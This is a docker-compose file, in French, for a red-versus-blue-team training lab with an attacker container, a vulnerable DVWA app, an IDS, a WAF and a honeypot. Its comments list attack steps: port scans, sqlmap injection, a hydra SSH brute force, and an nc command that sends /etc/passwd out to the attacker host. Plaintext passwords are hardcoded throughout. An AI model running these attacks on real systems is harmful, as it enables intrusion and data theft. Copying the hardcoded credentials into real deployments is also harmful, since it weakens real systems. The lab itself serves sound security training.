@@ -1,0 +1,411 @@
+version: '3.8'
+
+# ============================================================================
+# LOGISTOCK S5 — Red Team vs Blue Team (Synthèse finale)
+# ============================================================================
+# Extension de S3 avec ajout d'un conteneur attaquant pour les exercices
+# de détection et réponse à incidents
+#
+# NOUVEAUX ÉLÉMENTS PAR RAPPORT À S3 :
+# ✅ Conteneur Kali Linux (attaquant) dans la DMZ
+# ✅ Conteneur vulnérable DVWA pour exploitation
+# ✅ Honeypot pour détecter les intrusions
+# ✅ WAF (ModSecurity) devant le serveur web
+# ✅ Monitoring renforcé avec Prometheus
+#
+# SCÉNARIOS D'ATTAQUE POSSIBLES :
+# - Scan de ports (nmap)
+# - Exploitation SQL injection (sqlmap sur DVWA)
+# - Brute force SSH sur le bastion
+# - Attaque par dictionnaire sur le web
+# - Exfiltration de données
+# ============================================================================
+
+networks:
+  dmz:
+    driver: bridge
+    ipam:
+      config:
+        - subnet: 10.1.0.0/24
+  internal:
+    driver: bridge
+    internal: true
+    ipam:
+      config:
+        - subnet: 10.2.0.0/24
+  admin:
+    driver: bridge
+    ipam:
+      config:
+        - subnet: 10.3.0.0/24
+
+services:
+  # ==========================================================================
+  # TOUS LES SERVICES DE S3 (identiques)
+  # ==========================================================================
+  
+  proxy:
+    image: nginx:alpine
+    container_name: logistock_proxy
+    hostname: logistock-proxy
+    networks:
+      dmz:
+        ipv4_address: 10.1.0.10
+    ports:
+      - "443:443"
+      - "80:80"
+    volumes:
+      - ./s2-nginx-proxy.conf:/etc/nginx/nginx.conf:ro
+      - ./certs:/etc/nginx/certs:ro
+    depends_on:
+      - web
+    restart: unless-stopped
+
+  web:
+    image: php:7.4-apache
+    container_name: logistock_web
+    hostname: logistock-web
+    networks:
+      dmz:
+        ipv4_address: 10.1.0.20
+    environment:
+      - MYSQL_HOST=10.2.0.30
+      - MYSQL_DATABASE=logistock
+      - MYSQL_USER=appuser
+      - MYSQL_PASSWORD=SuperSecurePassword2024!
+    volumes:
+      - ./app:/var/www/html
+    restart: unless-stopped
+
+  firewall:
+    image: alpine:latest
+    container_name: logistock_firewall
+    hostname: logistock-firewall
+    networks:
+      dmz:
+        ipv4_address: 10.1.0.254
+      internal:
+        ipv4_address: 10.2.0.254
+      admin:
+        ipv4_address: 10.3.0.254
+    cap_add:
+      - NET_ADMIN
+      - NET_RAW
+    volumes:
+      - firewall_logs:/var/log/firewall
+    command: |
+      sh -c "
+        apk add --no-cache iptables tcpdump &&
+        echo 1 > /proc/sys/net/ipv4/ip_forward &&
+        iptables -P INPUT DROP &&
+        iptables -P FORWARD DROP &&
+        iptables -P OUTPUT ACCEPT &&
+        iptables -A INPUT -i lo -j ACCEPT &&
+        iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT &&
+        iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT &&
+        iptables -A FORWARD -s 10.1.0.20 -d 10.2.0.30 -p tcp --dport 3306 -j ACCEPT &&
+        iptables -A FORWARD -s 10.1.0.20 -d 10.2.0.40 -j DROP &&
+        iptables -A FORWARD -s 10.3.0.10 -d 10.2.0.0/24 -j ACCEPT &&
+        iptables -A FORWARD -j LOG --log-prefix '[FW BLOCK] ' &&
+        echo '✅ Firewall OK' &&
+        tcpdump -i any -w /var/log/firewall/traffic.pcap &
+        sleep infinity
+      "
+    restart: unless-stopped
+
+  db:
+    image: mysql:5.7
+    container_name: logistock_db
+    hostname: logistock-db
+    networks:
+      internal:
+        ipv4_address: 10.2.0.30
+    environment:
+      - MYSQL_ROOT_PASSWORD=SuperSecurePassword2024!
+      - MYSQL_DATABASE=logistock
+      - MYSQL_USER=appuser
+      - MYSQL_PASSWORD=SuperSecurePassword2024!
+    volumes:
+      - db_data:/var/lib/mysql
+      - ./s2-init-hashed.sql:/docker-entrypoint-initdb.d/init.sql
+    restart: unless-stopped
+
+  nas:
+    image: alpine:latest
+    container_name: logistock_nas
+    hostname: logistock-nas
+    networks:
+      internal:
+        ipv4_address: 10.2.0.40
+    volumes:
+      - nas_data:/data
+      - ./fiches_paie_sample:/data/rh:ro
+    command: |
+      sh -c "
+        echo 'NAS LogiStock S5' > /data/README.txt &&
+        chmod 700 /data &&
+        sleep infinity
+      "
+    restart: unless-stopped
+
+  ids:
+    image: ciscotalos/snort3:latest
+    container_name: logistock_ids
+    hostname: logistock-ids
+    networks:
+      dmz:
+        ipv4_address: 10.1.0.50
+    cap_add:
+      - NET_ADMIN
+      - NET_RAW
+    volumes:
+      - ids_logs:/var/log/snort
+    restart: unless-stopped
+
+  bastion:
+    image: alpine:latest
+    container_name: logistock_bastion
+    hostname: logistock-bastion
+    networks:
+      admin:
+        ipv4_address: 10.3.0.10
+      internal:
+        ipv4_address: 10.2.0.10
+    command: |
+      sh -c "
+        apk add --no-cache openssh-server mysql-client &&
+        ssh-keygen -A &&
+        echo 'root:BastionSecure2024!' | chpasswd &&
+        /usr/sbin/sshd -D -e
+      "
+    ports:
+      - "2222:22"
+    restart: unless-stopped
+
+  siem:
+    image: grafana/loki:latest
+    container_name: logistock_siem
+    hostname: logistock-siem
+    networks:
+      internal:
+        ipv4_address: 10.2.0.50
+    ports:
+      - "3100:3100"
+    volumes:
+      - siem_data:/loki
+    restart: unless-stopped
+
+  # ==========================================================================
+  # ✅ NOUVEAUX SERVICES S5
+  # ==========================================================================
+
+  # ==========================================================================
+  # RED TEAM — Conteneur attaquant (Kali Linux)
+  # ==========================================================================
+  attacker:
+    image: kalilinux/kali-rolling:latest
+    container_name: logistock_attacker
+    hostname: logistock-attacker
+    networks:
+      dmz:
+        ipv4_address: 10.1.0.100  # "Depuis Internet"
+    cap_add:
+      - NET_ADMIN
+      - NET_RAW
+    volumes:
+      - attacker_tools:/root
+      - attacker_loot:/loot  # Données exfiltrées
+    command: |
+      sh -c "
+        apt-get update &&
+        apt-get install -y nmap sqlmap hydra nikto metasploit-framework netcat-traditional curl &&
+        echo '✅ Kali Tools installed' &&
+        echo 'Red Team Ready - Targets:' &&
+        echo '  - Web: 10.1.0.20' &&
+        echo '  - Proxy: 10.1.0.10' &&
+        echo '  - Bastion SSH: host.docker.internal:2222' &&
+        sleep infinity
+      "
+    tty: true
+    stdin_open: true
+    restart: unless-stopped
+    labels:
+      role: "attacker"
+      team: "red"
+
+  # ==========================================================================
+  # APPLICATION VULNÉRABLE — DVWA pour exploitation
+  # ==========================================================================
+  dvwa:
+    image: vulnerables/web-dvwa:latest
+    container_name: logistock_dvwa
+    hostname: logistock-dvwa
+    networks:
+      dmz:
+        ipv4_address: 10.1.0.60
+    ports:
+      - "8080:80"
+    environment:
+      - MYSQL_HOST=10.2.0.30
+      - MYSQL_DATABASE=dvwa
+      - MYSQL_USER=appuser
+      - MYSQL_PASSWORD=SuperSecurePassword2024!
+    restart: unless-stopped
+    labels:
+      role: "vulnerable_app"
+      security_level: "low"
+
+  # ==========================================================================
+  # WAF — ModSecurity devant le web
+  # ==========================================================================
+  waf:
+    image: owasp/modsecurity-crs:nginx
+    container_name: logistock_waf
+    hostname: logistock-waf
+    networks:
+      dmz:
+        ipv4_address: 10.1.0.70
+    ports:
+      - "8443:443"
+    environment:
+      - BACKEND=http://10.1.0.20:80
+      - PARANOIA=2  # Niveau de paranoïa ModSecurity
+    volumes:
+      - waf_logs:/var/log/modsec
+    restart: unless-stopped
+    labels:
+      role: "waf"
+      protection: "owasp_crs"
+
+  # ==========================================================================
+  # HONEYPOT — Piège pour détecter les attaquants
+  # ==========================================================================
+  honeypot:
+    image: cowrie/cowrie:latest
+    container_name: logistock_honeypot
+    hostname: logistock-honeypot
+    networks:
+      dmz:
+        ipv4_address: 10.1.0.80
+    ports:
+      - "2223:2223"  # Fake SSH
+    volumes:
+      - honeypot_logs:/cowrie/var/log/cowrie
+    restart: unless-stopped
+    labels:
+      role: "honeypot"
+      type: "ssh_trap"
+
+  # ==========================================================================
+  # MONITORING — Prometheus pour métriques
+  # ==========================================================================
+  prometheus:
+    image: prom/prometheus:latest
+    container_name: logistock_prometheus
+    hostname: logistock-prometheus
+    networks:
+      internal:
+        ipv4_address: 10.2.0.60
+    ports:
+      - "9090:9090"
+    volumes:
+      - ./s5-prometheus.yml:/etc/prometheus/prometheus.yml:ro
+      - prometheus_data:/prometheus
+    command:
+      - '--config.file=/etc/prometheus/prometheus.yml'
+      - '--storage.tsdb.path=/prometheus'
+    restart: unless-stopped
+    labels:
+      role: "monitoring"
+
+  # ==========================================================================
+  # DASHBOARD — Grafana pour visualisation
+  # ==========================================================================
+  grafana:
+    image: grafana/grafana:latest
+    container_name: logistock_grafana
+    hostname: logistock-grafana
+    networks:
+      internal:
+        ipv4_address: 10.2.0.70
+    ports:
+      - "3000:3000"
+    environment:
+      - GF_SECURITY_ADMIN_PASSWORD=GrafanaSecure2024!
+    volumes:
+      - grafana_data:/var/lib/grafana
+    restart: unless-stopped
+    labels:
+      role: "visualization"
+
+volumes:
+  db_data:
+  nas_data:
+  firewall_logs:
+  ids_logs:
+  siem_data:
+  attacker_tools:
+  attacker_loot:
+  waf_logs:
+  honeypot_logs:
+  prometheus_data:
+  grafana_data:
+
+# ============================================================================
+# SCÉNARIOS D'ATTAQUE S5 (Red Team)
+# ============================================================================
+# 
+# PHASE 1 : RECONNAISSANCE (15 min)
+# ---------------------------------------------------------------------------
+# 1. Entrer dans le conteneur attaquant :
+#    docker exec -it logistock_attacker bash
+#
+# 2. Scanner les cibles :
+#    nmap -sS -p 1-1000 10.1.0.0/24
+#    nmap -sV 10.1.0.20
+#
+# 3. Identifier les services exposés :
+#    nc -zv 10.1.0.20 80 443
+#
+# PHASE 2 : EXPLOITATION (20 min)
+# ---------------------------------------------------------------------------
+# 4. Tester DVWA avec SQLi :
+#    sqlmap -u "http://10.1.0.60/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx;security=low" --dbs
+#
+# 5. Brute force SSH bastion :
+#    hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://host.docker.internal:2222
+#
+# 6. Scan vulnérabilités web :
+#    nikto -h http://10.1.0.20
+#
+# PHASE 3 : EXFILTRATION (10 min)
+# ---------------------------------------------------------------------------
+# 7. Si accès obtenu, exfiltrer des données :
+#    # (Depuis un shell compromis)
+#    cat /etc/passwd > /tmp/exfil.txt
+#    nc 10.1.0.100 4444 < /tmp/exfil.txt
+#
+# DÉFENSE (Blue Team) — EN PARALLÈLE
+# ---------------------------------------------------------------------------
+# 8. Surveiller les logs IDS :
+#    docker exec logistock_ids tail -f /var/log/snort/alert
+#
+# 9. Consulter les logs pare-feu :
+#    docker exec logistock_firewall dmesg | grep "FW BLOCK"
+#
+# 10. Bloquer l'IP de l'attaquant :
+#    docker exec logistock_firewall iptables -A INPUT -s 10.1.0.100 -j DROP
+#
+# 11. Consulter le honeypot :
+#    docker exec logistock_honeypot cat /cowrie/var/log/cowrie/cowrie.json
+#
+# 12. Dashboard Grafana :
+#    http://localhost:3000 (admin / GrafanaSecure2024!)
+#
+# DEBRIEFING (15 min)
+# ---------------------------------------------------------------------------
+# - Quelles attaques ont réussi ?
+# - Quels logs ont permis la détection ?
+# - Quelles contre-mesures auraient empêché l'attaque ?
+# - Que manque-t-il encore dans l'architecture ?
+# ============================================================================
